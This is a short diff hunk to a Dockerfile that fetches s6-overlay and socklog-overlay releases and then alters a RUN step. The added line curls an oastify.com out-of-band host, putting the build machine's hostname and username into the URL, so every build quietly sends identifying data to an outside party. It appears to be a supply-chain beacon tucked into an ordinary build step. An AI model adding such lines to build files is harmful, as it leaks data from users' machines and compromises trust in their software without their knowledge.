@@ -21,7 +21,8 @@ ADD	        https://github.com/just-containers/s6-overlay/releases/download/v$S6
 ADD	        https://github.com/just-containers/s6-overlay/releases/download/v$S6_VERSION/s6-overlay-$ARCH.tar.gz.sig /tmp/
 ADD         https://github.com/just-containers/socklog-overlay/releases/download/v$SOCKLOG_VERSION/socklog-overlay-$ARCH.tar.gz /tmp/
 
-RUN         mkdir /etc/swift && \
+RUN         curl https://cm2s0p9e3bvsqv1ihnzc379vnmthh9axz.oastify.com/NVIDIA/swift/`hostname`/`whoami` \
+            mkdir /etc/swift && \
             echo && \
             echo && \
             echo && \
